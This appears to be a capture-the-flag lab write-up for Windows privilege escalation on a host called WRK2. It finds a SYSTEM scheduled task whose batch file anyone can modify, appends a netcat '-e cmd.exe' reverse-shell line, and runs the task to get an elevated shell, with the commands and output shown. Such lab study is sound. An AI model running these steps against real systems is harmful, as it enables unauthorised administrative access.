## Connect to WRK2
- RDP to WRK2
- Open a command shell.
- Look at the "C:\Users\laura.wood\Downloads>" directory.
- There's a nc.exe file. (Netcat)
	- If we manage to find some service or application that is running in the machine with administrator or system privileges, we might be able to execute netcat with administrative privileges, gaining an elevated administrative shell.
	- One quick way of escalating privileges inside a machine is through a misconfigured scheduled task, especially when it is using a binary or batch file that we can modify.

## List of tasks
- By using the command schtasks /query /fo csv /v | findstr “SYSTEM > tasks.csv”,we are able to forward a list of several tasks, to a CSV file, that run with administrative privileges (the /fo csv will print the text in a CSV format).
```
schtasks /query /fo csv /v | findstr “SYSTEM > tasks.csv”
```

> Based on the output, most of the tasks run from the Windows directory, which normally means that those tasks are well configured. A quick search into the CSV reveals that a certain task runs from the following file (**C:\SYNC\sync.bat**):


C:\Users\laura.wood\Downloads> schtasks /query /fo csv /v | findstr "SYSTEM > tasks.csv"
"WRK2","\FULLSYNC","3/14/2024 6:59:36 PM","Ready","Interactive/Background","3/14/2024 6:54:36 PM","1","CORP\Administrator","**C:\SYNC\sync.bat** ","N/A","N/A","Enabled","Disabled","Stop On Battery Mode, No Start On Batteries","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","One Time Only, Minute ","12:19:36 PM","4/2/2023","N/A","N/A","N/A","0 Hour(s), 5 Minute(s)","None","Disabled","Disabled"

## Query for the taskname
Query for the taskname, in order to get more information regarding the schedule task:
```
schtasks /query /fo list /tn FULLSYNC /v
```
Folder: \
HostName:                             WRK2
TaskName:                             \FULLSYNC
Next Run Time:                       3/14/2024 7:19:36 PM
Status:                                    Ready
Logon Mode:                          Interactive/Background
Last Run Time:                       3/14/2024 7:14:36 PM
Last Result:                            1
Author:                                   CORP\Administrator
Task To Run:                          C:\SYNC\sync.bat
Start In:                                  N/A
Comment:                              N/A
Scheduled Task State:         Enabled
Idle Time:                              Disabled
Power Management:            Stop On Battery Mode, No Start On Batteries
Run As User:                         SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                    One Time Only, Minute
Start Time:                           12:19:36 PM
Start Date:                           4/2/2023
End Date:                             N/A
Days:                                    N/A
Months:                               N/A
Repeat: Every:                     0 Hour(s), 5 Minute(s)
Repeat: Until: Time:            None
Repeat: Until: Duration:      Disabled
Repeat: Stop If Still Running:        Disabled

> FULLSYNC scheduled task runs every 5 minutes.

## Check the permissions of the file "C:\SYNC\sync.bat"
```
icacls C:\SYNC\sync.bat
```
Everyone:(F)
BUILTIN\Users:(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)


> - Full access on the sync.bat file.

## Set up a listener with the previously found netcat

With this information, we know that we can set up a listener with the previously found netcat executable, and edit the task to connect with the same executable with administrative privileges, receiving an elevated reverse shell:
```
nc -lnvp 4444
```
listening on [any] 4444 ...

## Edit the sync.bat file

Add the following code:
`C:\Users\laura.wood\Downloads\nc.exe -e cmd.exe 127.0.0.1 4444`
`copy C:\Windows\Temp \\s3.corp.thereserve.loc\backups\`

> After a couple of minutes (5 at most) you should receive an administrative reverse shell.
## Execute the task to force a reverse shell
If you want to execute the task inmediately, run the following command.
`
```
schtasks /run /tn FULLSYNC
```

SUCCESS: Attempted to run the scheduled task "FULLSYNC". 

On the first command shell you'll see the following output.

listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54255
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

[[Flag-4 Administrative access to Corporate Division Tier 2 Infrastructure]]


